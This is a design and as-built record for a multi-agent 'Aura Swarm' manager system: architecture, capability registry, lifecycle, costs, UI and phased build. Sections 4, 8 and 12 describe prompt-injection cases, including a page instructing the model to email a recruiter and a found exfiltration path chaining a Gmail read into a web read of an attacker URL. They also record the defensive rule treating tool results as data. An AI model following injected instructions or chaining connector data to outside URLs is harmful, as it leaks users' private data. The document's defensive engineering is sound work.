# Aura Swarm Stage 2 Architecture: managers do real, read-only work

Status: IMPLEMENTED 2026-10-01 (2a, 2b and 2c together, after a Codex review; see section 12 for where the build departs from this text). Live on prod since revision juno-backend-00431-zc6 (2026-10-01) with all four model chains set; first real sessions ran that day. Stage 1 (the routing sandbox and the chat-style Swarm tab) is the shipped baseline; the design record for the whole system is the Claude Doc "Aura Swarm plan and findings" (claude.ai/code/artifact/a1bb2c41-9800-4a13-946f-d6e4e6bea3e9).

Scope: `juno-backend` (`../Aura/backend`, `services/swarm/`) owns the runtime. Aura-Desktop owns the surfaces (`src/dashboard/pages/SwarmPage.tsx`, `src/dashboard/pages/swarm/`, `src/lib/swarmApi.ts`). `ECOSYSTEM.md` changes when the routes ship.

---

## 0. Verdict and approval boundary

Make a manager do its job, read-only. You DM it, a front-door message routes to it, or one of its routines fires at 8am with the laptop closed. It searches the web, reads pages and the connectors you granted it, and posts a sourced report into its DM channel, then notifies you. Sends, posts and applications appear as inert drafts; nothing acts on the world in this stage.

Build it as a copy of the Research engine's proven job pattern (Firestore state, one Cloud Task per bounded stage, lease, reserve-then-settle spend, one commit transaction per stage, a recovery sweep), with a code-owned step loop over a server-side capability registry. Do not adopt Temporal, LangGraph or a managed agent platform.

Approving this document approves these product choices, not implementation:

1. Everyone can run managers, with no per-user plan gate or daily limit (decided 2026-10-01: no active users yet). Per-session hard caps and a project-wide daily wallet stay regardless.
2. Stage 2 is read-only by construction: the capability registry has no write entry.
3. Connector access is granted per manager per connector, default off.
4. Routines are explicit: a manager may suggest a schedule; nothing fires until you enable it.
5. Models are placeholders for Varun to choose; an empty chain refuses with `models_unset`.
6. The routing sandbox endpoint stays for older desktops; the persisted Swarm replaces it in the current build.

### 0.1 Verified current state and proof limit

| Capability | State | Evidence | Stage 2 decision |
|---|---|---|---|
| Durable multi-stage job engine | Exists (Research) | `services/research/engine.py` `start` L319, `advance` L484 (lease claim, `_admit_stage` L722, stage body, one transaction committing state, budget, next job and outbox); `cloud_tasks.py` `CloudTasksDispatcher` L43, queue `juno-research`, `POST /internal/research/step` (`main.py:1686`); `LocalResearchDispatcher` L150 off production | Copy the pattern into `services/swarm/runner/` on a new queue `juno-swarm` |
| Recovery sweep | Exists | `research/sweep.py:run_sweep` L96, scheduler slot `minute % 5 == 4` | New `_run_swarm_sweep` at `minute % 5 == 3` |
| Spend ledger and project wallet | Exists | `research/ledger.py` `reserve_project_spend` L357, `settle_project_receipt` L500, fails closed; `research/usage.py:normalize_provider_usage` L231 | Reuse with `PROJECT_SWARM_DAILY_COST_CAP_MICROUSD` |
| Tool calling | Partial | `model_provider.chain()` L1130 takes no tools; tools only on Anthropic `balanced`/`expert`, which cannot hop providers with tools (L1338) | Code-owned loop: the model returns a typed `StepDecision`, code runs it (the browser agent's pattern, `handlers/agent.py:handle_step` L111) |
| Read capabilities | Exist | `agents/data_fetchers/brave_search.py:brave_search` L159; `research/tiered_reader.py:TieredPageReader` L67 behind `research/url_policy.evaluate_url` L147; gmail `list_recent_messages` L193 / `get_message` L233; calendar `query_events` L625; classroom `list_due_work` L170; github `activity` L174; x `search_bookmarks` L207 (billed via `x_budget.py`); notion `recent_pages` L43; research `engine.start` | Wrap each as a registry row |
| Recurrence | Exists | `services/rituals.py` (weekdays + local time + tz, deterministic occurrence ids, `arm_next_occurrence` L171); `/scheduler/tick` every minute (`handlers/scheduler.py:handle_scheduler_tick` L629) | Same model for `swarm_routines` |
| Approvals | Exists, not used here | `services/pending_actions.py` `propose` L171, `approve` L302; desktop `ActionApprovalCard.tsx` | Stage 4 (action intents) |
| Desktop outbox | Exists | `notifications/desktop_outbox.py` `NOTIFICATION_TYPES` L62, `ACTIONS` L78 (unknown action raises); desktop allowlists in `desktopNotificationContract.ts` L32/L65; `supported_actions` heartbeat (`useDesktopNotifications.ts` 189-216) | Four swarm types and `view_swarm_channel` in both repos |
| Account deletion | Exists | `handlers/account.py:_delete_all_user_data` L65 recursively deletes `users/{uid}` | Every swarm collection lives under `users/{uid}`; nothing extra to register |
| Swarm persistence, runs, grants, routines | Missing | `handlers/swarm_sandbox.py` is stateless; roster and thread live in desktop localStorage `aura.swarm-sandbox.v1`; `routines`, `connectors`, `approval_boundary`, `tools`, `context_scope` have no reader anywhere | The gap this stage closes |

Proof limit: source inspection of both repos plus one live sandbox exercise on prod revision `juno-backend-00427-hv4` (2026-10-01). Brave and Firecrawl prices below are not verified against live pricing pages.

### 0.2 User journey

`you -> DM / front-door route / routine / Run now -> brief -> (grant prompt if a needed connector is not granted) -> working message with live steps -> report in the manager's DM -> toast if the window is hidden -> follow-up DM continues the thread`

- **Immediate:** the DM shows your message and a "working" message within ~250 ms of Send.
- **Progress:** each step appears as it commits (event-backed, never estimated): which capability ran, on what, how long.
- **Final:** a report embed with a summary, findings each citing a source, gaps (what it could not read and why), inert drafts and next steps.
- **Partial, cancelled, failed:** always a message in the DM with the typed reason and whatever was found. Never a silent empty result.

## 1. The primitive

One loop. Named managers are data, not code paths.

```
 trigger ─► Session(brief, manager, origin) ─► PLAN ─► STEP × n ─► (VERIFY) ─► REPORT ─► notify
   │            typed, deterministic id          │        │                       │
   ├ DM message                                  │        └ StepDecision: call(capability_id, args) | finish | ask_user
   ├ front-door "route" decision                 │          code validates args against the registry schema, runs it,
   ├ routine occurrence                          │          appends a trimmed, untrusted-marked result to the scratchpad
   └ "Run now" chip                              └ Plan: criteria[] (each traced to a brief clause), approach
```

Job Hunt, Silicon Brief and a student's Semester manager differ only in brief, grants and routines.

### 1.1 Capability registry

`services/swarm/capabilities.py` (extends the existing file, which already holds the capability cards and connector list).

| id | Backed by | Args | Grant | Per-session cap |
|---|---|---|---|---|
| `web.search` | `brave_search(feature="swarm")` | query, recency | none | 4 |
| `web.read` | `TieredPageReader` after `url_policy.evaluate_url` | url | none | 6 |
| `gmail.search` | `list_recent_messages` | query, days | gmail | 3 |
| `gmail.read` | `get_message` | message_id | gmail | 5 |
| `calendar.events` | `query_events` | from, to | google_calendar | 2 |
| `classroom.due` | `list_due_work` | days | google_classroom | 1 |
| `github.activity` | github `activity` | repo?, days | github | 2 |
| `x.bookmarks` | `search_bookmarks` | query | x | 1 |
| `notion.recent` | `recent_pages` | days | notion | 1 |
| `aura.research` | research `engine.start` | question | none | 1 |

Each row carries a pydantic args model, a result trimmer (≤1.5 KB into the scratchpad), a timeout (30 s), a trust label (web or connector) and its grant requirement. The registry is the only thing the step prompt lists; an unknown id or invalid args is a failed attempt, never an exception. There is no write row, so a prompt-injected page can at worst pollute a report.

`aura.research` is a hand-off: it starts one Research run (its own engine, its own wallet) and the report links it. Swarm never re-implements research.

### 1.2 Contracts

`services/swarm/runtime_models.py`, strict structured output:

- `SessionStart{manager_id, brief ≤2000, origin: dm|route|routine|run_now, client_session_id}`
- `Plan{criteria[≤6]{id, text, from_brief}, approach ≤400}`
- `StepDecision{action: call|finish|ask_user, capability_id?, args?, why ≤200, question?}`
- `ManagerReport{summary ≤1200, findings[≤12]{claim, source_refs[]}, drafts[≤5]{kind: email|post|message|application, destination, body}, gaps[]{capability_id, reason}, next_steps[≤5]}`; drafts are inert
- `VerifierVerdict{per_criterion[]{criterion_id, pass, evidence_refs[]}}`; a pass with empty evidence is rewritten to fail (the design doc's early-victory gate)

Model chains, each a feature-named settings list Varun fills: `SWARM_PLANNER_MODELS`, `SWARM_STEP_MODELS`, `SWARM_REPORT_MODELS`, `SWARM_VERIFIER_MODELS`. Every new id needs rows in `research/usage.py MODEL_RATES` and `analytics/llm_pricing.py`, or metering fails closed.

## 2. Data flow

```
Desktop (Swarm tab)                         juno-backend (Cloud Run)                       Cloud Tasks juno-swarm
───────────────────                         ────────────────────────                       ─────────────────────
POST /swarm/managers/{id}/run ───► handle_run: auth, read roster+grants (2 reads),
  (DM send, Run now)                 wallet pre-check, txn: session doc + stage 0 +
                                     DM user message + "working" message (4 writes)  ───► enqueue stage "plan"
  ◄── 202 {session_id} ~250 ms
                                    /internal/swarm/step (OIDC):                     ◄─── {uid, session_id, stage}
                                      claim manager lease (fenced generation)
                                      reserve_project_spend (1 txn)
                                      model call (placeholder chain) 2-15 s
                                      capability call ≤30 s
                                      settle + commit txn: step row, scratch,
                                      state_revision++, next stage, outbox      ───► enqueue next stage
GET /swarm/sessions/{id}?rev=N  ───► 1 doc read; "unchanged" if rev==N
  every 2.5 s while running
GET /swarm/channels/{c}/messages?after_seq= ─► only when rev changed (1 query)
                                    REPORT stage: report message + outbox row
GET /desktop/notifications (60 s) ◄─ swarm_report_ready (when_hidden) → click → /agents?tab=swarm&ch=m:{id}
/scheduler/tick (1/min) ──► routine sweep: query next_run_at<=now (collection group, indexed),
                             txn per due routine: session id = routine_id:epoch, advance next_run_at ──► enqueue
```

### 2.1 Routes

| Route | Caller | Purpose |
|---|---|---|
| `GET /swarm/state` | desktop | roster, channels with `next_seq`, grants, routines, live sessions |
| `POST /swarm/message` | desktop | persisted routing; same decision shape as the sandbox; a `route` decision starts a session |
| `GET /swarm/channels/{id}/messages?after_seq=&limit=` | desktop | cursor page |
| `POST /swarm/managers/{id}/run` | desktop | start a session (DM send, Run now) |
| `GET /swarm/sessions/{id}?rev=` | desktop | live state; tiny "unchanged" body when rev matches |
| `POST /swarm/sessions/{id}/cancel` | desktop | sets `cancel_requested` |
| `PUT /swarm/managers/{id}/grants` | desktop | connector grants |
| `PUT /swarm/routines/{id}`, `DELETE ...` | desktop | enable, edit, remove |
| `POST /swarm/import` | desktop | one-time localStorage migration, idempotent on `client_import_id` |
| `DELETE /swarm` | desktop | reset: batch-deletes every swarm collection |
| `POST /internal/swarm/step` | Cloud Tasks (OIDC, `_verify_scheduler_token`) | advance one stage |

### 2.2 Firestore layout (under `users/{uid}/`)

- `swarm_state/roster`: the existing `Roster` JSON plus `version`; rank changes are version-conditioned transactions.
- `swarm_channels/{channel_id}`: `next_seq`, `last_preview`. `swarm_messages/{id}`: channel_id, seq, author{kind, agent_id}, parts, session_id, trust, created_at.
- `swarm_sessions/{id}`: manager_id, origin, brief, state, state_revision, plan, step_count, caps used, cost_microusd, cancel_requested, lease{holder, generation, expires_at}, created_at, ended_at, stop_reason. Subcollection `steps/{n}`: capability_id, args hash, duration_ms, result_excerpt (≤1.5 KB, untrusted), tokens.
- `swarm_grants/{manager_id}`: `{connector: granted_at}`, empty by default.
- `swarm_routines/{id}`: manager_id, brief, weekdays, local_time, tz (IANA), enabled, next_run_at, last_session_id.
- Root `swarm_project_budget/{day}`: reserved and spent microusd (no user data).

What is stored and what is not:

| Stored | Not stored |
|---|---|
| Report text; quoted snippets ≤300 chars per finding | Full emails, full pages |
| Step metadata and ≤1.5 KB result excerpts (pruned after 14 days by the sweep) | Raw model transcripts |
| Sessions and messages until you reset | Anything connector-derived in logs (counts, ids and durations only) |

## 3. Lifecycle

### 3.1 Session state machine

`queued` [handle_run or routine sweep] → `planning` [step worker] → `acting` [step worker, loops] → `verifying` (2c) → `reporting` → `done` | `partial` | `failed` | `cancelled`, plus `waiting_user` (an `ask_user` decision parks with no task enqueued and resumes on your next DM).

- **Deterministic ids:** `session_id = client_session_id` (DM, Run now) or `routine_id:scheduled_epoch` (routine); task name `session_id:stage_n`. A double click, a retried request or a duplicate tick creates nothing.
- **Cancellation is a write**, as in Research: `cancel_requested` is read at commit; the in-flight call is bounded (60 s model, 30 s capability); no next stage; a partial report says "Stopped by you".
- **Leases:** one live session per manager (TTL 3 min, renewed per stage, fencing generation checked at commit, a stale holder's commit is rejected); 4 live sessions per user. A second DM while a session runs queues as the next brief.
- **Recovery:** the sweep re-dispatches stages whose lease expired, closes sessions past their 30 min wall as `partial` with what they had, and prunes old steps.

### 3.2 Caps per session

From the design doc's "later as jobs" column: 12 model decisions, the capability caps in 1.1, 3 evaluate rounds, 5 attempts per task, stage attempt cap 2 (Research's `STAGE_ATTEMPT_CAP`), 60 s per model call, 30 s per capability, 30 min wall. The same capability with the same args hash twice in a row counts as no progress and ends the session `partial`. Routines may spend at most 80% of the daily wallet, so interactive runs always keep 20%.

## 4. Three non-obvious traces

1. **Silicon Brief at 08:00 IST, laptop closed.** The 02:30 UTC tick runs the routine query (1 indexed query, about 1 doc) and one transaction (2 writes). The session runs plan, `web.search` ×2, `web.read` ×3, report: about 7 stages, 45-90 s, ~60 Firestore operations. The report lands in the DM with an outbox row. At 09:10 the desktop opens; within 60 s it toasts "Silicon Brief: today's note on HBM4 bandwidth"; clicking deep-links to the DM. `next_run_at` is recomputed from local time and tz with `zoneinfo` after every occurrence, so DST shifts are correct; a tick missed during a deploy runs once on the next tick, never twice.
2. **"Prep me for Thursday's HappyRobot interview" in #group.** The classifier routes it to Job Hunt; a `route` decision now starts a session with that text as the brief. The plan reads `calendar.events` (granted), finds the invite, hands off `aura.research` ("HappyRobot, forward deployed engineer role") and runs `gmail.search` "HappyRobot" (granted). The report holds a prep summary, the linked Research brief and an inert thank-you draft. If Gmail was never granted, `gaps` says "Gmail is not granted to Job Hunt" with a Grant button and the report still arrives, as `partial`.
3. **An injected job page, then Stop.** `web.read` returns text telling the model to email the recruiter. It sits in the scratchpad labelled untrusted web content; no write capability exists, so the worst case is a polluted claim, which the verifier (2c) fails for lack of evidence. You press Stop: the in-flight read finishes within 30 s, the commit ends the session `cancelled` with a partial report, and only the stages that ran were billed, already settled.

## 5. Use-case matrix

| # | User | Trigger | Inputs | Perfect behaviour |
|---|---|---|---|---|
| 1 | Job seeker | Job Hunt routine, weekdays 08:00 | web.search, web.read | 5 new matching roles with links, none seen in the last 5 reports |
| 2 | Job seeker | DM "notes for this JD: <url>" | web.read | Gap list against the stated profile; a resume-edit draft (inert) |
| 3 | Learner | Silicon Brief 08:00 | search, read | One sourced insight with citations, not repeating the last 5 topics |
| 4 | Freelancer | UGC routine, Mondays | web.search, x.bookmarks | 10 founder prospects and pitch drafts (inert) |
| 5 | Student | "plan my week" to a Semester manager | classroom.due, calendar.events | A due-date plan; `partial` with a reconnect hint if Classroom is missing |
| 6 | Vibe coder | DM Ship "what changed this week" | github.activity | A digest by repo; an empty week says so plainly |
| 7 | Any | Front-door route to an existing manager | per brief | Session runs in that DM; #group shows a crosspost |
| 8 | Any | Connector revoked mid-week | gmail | `gaps` entry and reconnect hint, never a silent empty report |
| 9 | Any | Wallet exhausted at 10:00 | none | Session ends `partial`, stop_reason budget; due routines skip with an #activity line |
| 10 | Any | Stop pressed mid-run | none | Ends within 60 s, partial report, no further spend |
| 11 | Any | Manager paused or deleted while a routine is due | none | Paused: skipped and logged. Deleted: its routines are deleted in the same transaction |
| 12 | Any | Duplicate tick or double-click Run | none | Exactly one session |
| 13 | Any | Malicious page | web.read | No side effect possible; claim marked unverified |
| 14 | Any | Model chain empty | none | `models_unset` with its own copy; nothing reserved |

## 6. Cost

Model dollars wait on Varun's model choices; everything else is bounded here.

- **Per typical session:** ≤12 model calls with input bounded by a ~12 KB scratchpad, ≤4 Brave queries, ≤6 page reads (trafilatura first; Firecrawl only for thin, blocked or PDF pages, as `tiered_reader.py` already does), ~60 Firestore operations and ~10 Cloud Tasks. Firestore and Tasks are effectively free at this volume.
- **Global bound:** `PROJECT_SWARM_DAILY_COST_CAP_MICROUSD` in `deploy.sh`, sized like the browser agent's $10 a day. 0 refuses every run. It is a budget value, never a feature flag.
- **Revisit per-user limits** when either holds: more than 20 weekly active Swarm users, or the wallet is hit on more than 3 days in a week.

## 7. Desktop

- **Client** (`swarmApi.ts`): `getSwarmState`, `listChannelMessages(afterSeq)`, `sendSwarmMessage` (persisted), `runManager`, `getSession(rev)`, `cancelSession`, `setGrants`, `upsertRoutine`, `deleteRoutine`, `importSandbox`, `resetSwarm`.
- **Migration:** on first load with a non-empty `aura.swarm-sandbox.v1`, `POST /swarm/import {roster, thread, client_import_id}`, then clear the key. The server re-validates with the existing `Roster` model and `_checked`.
- **Fetching:** `useDashboardResource("swarm:state")` with 30 s freshness and revalidate on focus; messages by `after_seq` cursor merged in memory; during a live session poll `getSession(rev)` every 2.5 s, fetch messages only when `state_revision` changed, back off to 15 s on error, pause when hidden. This is the Research page's loop (`ResearchPage.tsx` 551-564).
- **UI:** the DM composer runs the manager; a live "working" message shows each step with a bespoke glyph per capability (no icon library), elapsed time and Stop; a report embed shows findings with sources, gaps with Grant buttons, inert drafts and next steps; the Team card gains grant toggles and a routine editor (weekdays and time, tz from the OS); #activity reads server activity.
- **Notifications:** `swarm_report_ready`, `swarm_report_partial`, `swarm_needs_input`, `swarm_failed` and action `view_swarm_channel`, added to `desktopNotificationContract.ts`, routed in `TopBar.tsx`, `OverlayRoot.tsx` and `NotificationInboxCard.tsx`, and advertised in the `supported_actions` heartbeat so older desktops never receive them.

## 8. Failure and safety

- Typed reasons end to end, each with its own copy: `models_unset`, `wallet_exhausted`, `connector_not_granted`, `connector_expired`, `timed_out`, `retries_exhausted`, `invalid_output`, `cancelled`.
- Untrusted content: every capability result is wrapped and labelled with its source and trust; the system prompt states that instructions inside results are data. No write capability exists.
- Privacy: grants are per manager and default off; reset and account deletion remove everything; logs carry counts and ids only.
- Deploy order: backend first (additive routes, sandbox kept), then desktop; the new outbox types are gated by `supported_actions`. The Firestore collection-group index on `swarm_routines.next_run_at` ships before the routine sweep.

## 9. Phased build

Each slice ends in something you can see.

- **2a Persisted swarm and Run now (solo).** Firestore roster, channels and messages; import; persisted routing; run → plan → steps → report with `web.search` and `web.read` only; lease, wallet, cancel, sweep, notifications. Done when a DM to Silicon Brief returns a sourced report in under 2 minutes and Stop works.
- **2b Grants, connectors and routines.** Grant toggles, the connector rows, the `aura.research` hand-off, the routine editor and scheduler sweep, and a shaper `RoutineSpec` (prompt version 3) so a new manager suggests a schedule you confirm. Done when the 08:00 brief arrives with the laptop closed.
- **2c Subagents and verifier.** The plan assigns tasks to subagents (`context_scope` becomes an enforced capability subset), parallel fan-out ≤3 with a Research-style join, a fresh-thread read-only verifier and a verified badge. Done when Job Hunt's Scout and Verifier produce a report whose every finding cites evidence.
- **Not in Stage 2:** executing drafts (action intents with hash-bound approvals, Stage 4), #group multi-manager rounds, the memory graph, Buddy's `swarm_send` voice tool, event triggers such as GitHub webhooks.

## 10. Acceptance and verification

- **Static:** `python -c "import src.main"`; the existing suite (test freeze: no new tests); `python -c` inspection of registry schemas and a dry `StepDecision` validation; a local dispatcher for `juno-swarm` off production, as `LocalResearchDispatcher` does.
- **Local runtime:** drive the dev app (UI Automation scripts, as on 2026-10-01). DM Silicon Brief and watch working → report; press Stop on a second run; enable a routine 2 minutes ahead and confirm exactly one `swarm_sessions` doc; confirm the toast and deep link.
- **Deployed:** wallet env var set, `juno-swarm` queue exists, the routine index exists, and a routine fires exactly once across a deploy.

## 11. Known risks and open questions (attack these first)

1. **Step-loop quality on the chosen chain.** A code-owned loop lives or dies on the model's `StepDecision`s. Run 10 real briefs per candidate model before any routine is enabled; record step count, no-progress endings and report usefulness.
2. **Routine spend.** Daily routines fan out searches and reads every day. Prove the per-session caps and the 80% routine share hold with 10 enabled routines before 2b ships.
3. **Repeat suppression.** "5 new roles" and "no repeat topics" need history in the plan prompt; this proposal bounds it to the last 5 report summaries (~2 KB). Unproven that this is enough.
4. **Routine index.** The collection-group query fails without its index; it must deploy before the sweep.
5. **Prices not verified live.** Brave and Firecrawl rates must be read from their current pricing pages before the wallet is sized.
6. **Verifier placement.** This proposal puts the verifier in 2c; if 2a reports turn out to invent findings, it moves into 2a.

## 12. As built: where the code departs from this document

A Codex review against both repos (28 findings, 4 of them deploy or money failures) changed the design before any code was written. The code is the source of truth; this is the map.

| This document says | Built instead | Why |
|---|---|---|
| Reuse `research/ledger.reserve_project_spend` | `services/swarm/wallet.py`, the same receipt pattern on `swarm_project_budget/{day}/swarm_receipts`, total plus routine share, uid stored hashed | The research ledger requires a spendable `research_runs` doc and reads the research cap |
| Only sessions spend | Routing (`/swarm/message` and the sandbox route) reserves a 12-attempt envelope too | Classifier, shaper and handover calls were unmetered |
| 12 decisions bounds spend | Each model call reserves attempts x the priciest link x the real prompt size (`costing.py`) and runs inside `attempt_budget` of exactly that many attempts; an id without a `MODEL_RATES` row refuses with `model_unpriced` | One `chain()` call retries and hops models |
| Task name `session_id:stage_n` | `swarm-<sha24(uid:session)>-<lane>-s<n>-d<dispatch>` | Colons are invalid, uid was unscoped, and redispatch needs a fresh name |
| Sweep re-dispatches expired leases | The session doc carries `next_check_at` (earliest of every lane's due time, lease expiry and the wall); the sweep re-dispatches anything past it | A crash between commit and enqueue stranded work |
| One live session per manager via the lease | `swarm_state/live {by_manager}` claimed in the start transaction, at most 4 per user | Two session docs could each hold a lease |
| A second DM queues as the next brief | Since 2026-10-03 it does (`queue.py`, at most 3 per manager, drained when the live session ends). A DM to a manager parked on a question is that question's answer (`handlers/swarm.handle_run` calls `runner.answer`); in #group the classifier sees a `Parked on a question` block and marks the route `answers_question`, which `persisted.route_message` feeds to `runner.answer` instead of the queue. `answer()` restores the wall time left when the session parked (`parked_at`), floor 5 minutes. The question card's inline box still calls `POST /sessions/{id}/answer` directly | The first cut refused with `manager_busy`. Then a parked manager still held its live slot, so a #group reply to its question queued behind it for the 24-hour `no_answer` sweep, and an answer after 30 minutes would have ended as `timed_out` |
| Cancel read at commit | Idle sessions end immediately; a leased one is re-read after its model call, before any capability runs, and again at commit | A capability could run after Stop |
| Partial report always | A zero-spend fallback report built from committed excerpts on Stop, empty wallet, timeout or model failure | The report itself needed a paid call |
| Read-only is safe | `web.read` only fetches URLs already in the source table (search results and the brief); `web.search` is refused once a connector has run in the session | Gmail then `web.read(attacker/?d=...)` exfiltrated |
| URL policy guards reads | `tiered_reader.py` checks every redirect hop with `evaluate_url` (fixes Research too) | Redirects were followed unchecked |
| Connector args (`days` etc.) | Rows match the real signatures; X is cached-only; PDFs are a gap; Notion uses the uncached fetch so a revoked grant surfaces | The fetchers differ from the table in 1.1 |
| `aura.research` for everyone | Funded by Research's own entitlement; refused for routine origin; Swarm Stop signals the child run | Research has its own gates and wallet |
| Routine via `arm_next_occurrence` | Own claim transaction, `next_ritual_fire_at` for DST, missed days collapse to one run, skips logged to #activity | That helper is not a transactional claim |
| Sweep at `minute % 5 == 3` | Routines every minute; recovery at minutes 8, 23, 38, 53 | That slot is taken |
| Recursive delete is enough | Every commit checks `swarm_state/fence.epoch`; reset bumps it first, then batch-deletes | A worker could recreate docs mid-delete |
| Automatic localStorage import | A one-time button, only into an account with no swarm | The local key carries no account |
| Progress via message edits | Append-only `step` messages; the live chip renders from the polled session | The `after_seq` cursor cannot see edits |
| `source_refs[]` | Server-owned `s1..` ids, renumbered at commit for parallel lanes; unknown refs dropped, findings without one marked unsourced | No source table existed |
| Subagents as `context_scope` | A subagent's free-text `tools` select capability families (`registry.allowed_for`) | `context_scope` is prose |
| Step rows carry `tokens` (section 2.2) | Since 2026-10-02 each `swarm_steps` row carries `model`, `model_attempts`, `input_tokens`, `output_tokens`, `model_cost_microusd`, `model_latency_ms`; the session carries `tokens_in`, `tokens_out`, `model_calls`, `models_used`, `model_latency_ms`, `cost_unknown_calls` | Built late: the first cut collapsed usage to one cost |
| Session `cost_microusd` is what the wallet charged | Now incremented on failed stages and Stop-after-call too, and an unknown cost counts in `cost_unknown_calls` instead of adding 0 | The first cut skipped those paths, so the session under-read the wallet |
| Observability lives in logs | Every model call is a Langfuse generation under the session id with lane, step, attempt and origin; every capability is a `tool:<id>` span; refusals count on `swarm_project_budget/{day}.refusals`; one `llm_call` log row per attempt feeds BigQuery (see `Aura/MONITORING.md`) | Logs alone cannot give p95 by model or lifetime tokens per user |
| Connector grants default off; the user flips each one | Since 2026-10-02 a manager hired or extended with a connector the user already connected is granted it at hire (`persisted.route_message`, union with existing grants); the Team card switch is the off switch. The step list marks each account row `[granted]`, `[not granted]` or `[account not connected]` and the planner gets an `Accounts:` line. `ask_user` parks once per session (`MAX_ASKS`); later asks are answered in-prompt with "proceed on your best assumption" and every user answer rides in a `Facts from the user` block. `github.repos`, `github.tree` and `github.file` join `github.activity`. The #group confidence fallback question is gone and a free-text draft answer never produces a second ask | A manager hired for "my github" asked the user four times in seven steps for a repo URL and a docs link, with GitHub connected and `web.search` in hand |

Since 2026-10-03 the runner also refuses, in code, to park on a question a capability can answer (`runner._findable_by_capability`): a question asking for a URL, docs, a repo, a file or a path while `web.search` is still on offer (or the github readers are granted) takes the existing "proceed on your best assumption" path with a "find it yourself" instruction in the user's trust block, and still counts toward `asks_used`. The step prompt had forbidden exactly this and a manager did it anyway.

The 2026-10-02 completion patch sends free-text draft answers directly to the shaper with the original brief and answer. `swarm-sandbox-7` removes the contradictory broad-request ask instruction; after an answer, the shaper receives an assumption instruction and its `one_question` cannot trigger another vagueness question. Manager-limit and ownership-overlap checks still apply. `asks_used` counts suppressed attempts too: one visible question plus two assumption retries can leave it at 3; the fourth ask attempt ends the lane. GitHub file arguments use a compiled Python regex because Pydantic's default regex engine rejects the required lookaheads at import.

## 13. Phase 3: #group rounds (2026-10-01)

One #group message that routes to the Supervisor, or splits into routes for two or more managers, becomes a **round** (`services/swarm/rounds.py`, `users/{uid}/swarm_rounds/{rid}`). Up to 3 members start as ordinary sessions carrying `round_id`; a member's finalize transaction marks it ended on the round doc, and the last one flips the round to `ready` and dispatches lane `round` on `juno-swarm`. The merge writes one Supervisor `round_reply` into #group and one notification (members' own report toasts are suppressed). The classifier gained `involves` (prompt `swarm-sandbox-4`) so a Supervisor route names the managers it touches; empty means all active ones.

- `SWARM_SUPERVISOR_MODELS` is empty on purpose (Varun's choice). Without it the reply is a free digest of each member's report, labelled "Plain summary"; any model trouble falls back to that digest.
- Routes: `GET /swarm/rounds/{rid}?rev=`, `POST /swarm/rounds/{rid}/cancel` (stops every running member).
- Recovery: `rounds.sweep` (with the session sweep) forces rounds past 35 minutes and re-dispatches lost merges; it needs the `swarm_rounds (live, next_check_at)` COLLECTION_GROUP index, which `deploy.sh` preflights.
- A Supervisor route with exactly one relevant manager is a plain route; before this it was silently dropped.

## 14. Phase 4a: act with your approval (2026-10-02)

A finished report's draft can carry `target` x, linkedin or calendar (prompt `swarm-runtime-5`; drafts get server ids `d1..`). Review calls `POST /swarm/sessions/{sid}/drafts/{did}/propose`; `services/swarm/actions.py` re-reads the draft from the session, applies the user's text edit, and proposes ONE pending action through `services/pending_actions.py` (`origin="swarm"`, `source="sid:did"`). Approve is the existing `POST /actions/{id}/approve`, which runs the stored args once.

- Gates in code: finished sessions only; a public post is refused with `private_data_in_session` when the session read a private connector (`tainted`); a calendar hold (`swarm_calendar_hold`) books the primary calendar with no attendees, a deterministic event id, at most 12 h, within a year.
- `_claim` now refuses (`args_mismatch`) when the stored args no longer hash to `args_hash`; every finished action writes a lasting `users/{uid}/action_log/{id}` row (tool, origin, source, args hash, status, link; never the text).
- Swarm approvals stay out of `GET /actions/pending`, so they never surface as overlay cards.
- Gmail is out (OAuth not set up); Notion is 4b (needs the Research destination picker).
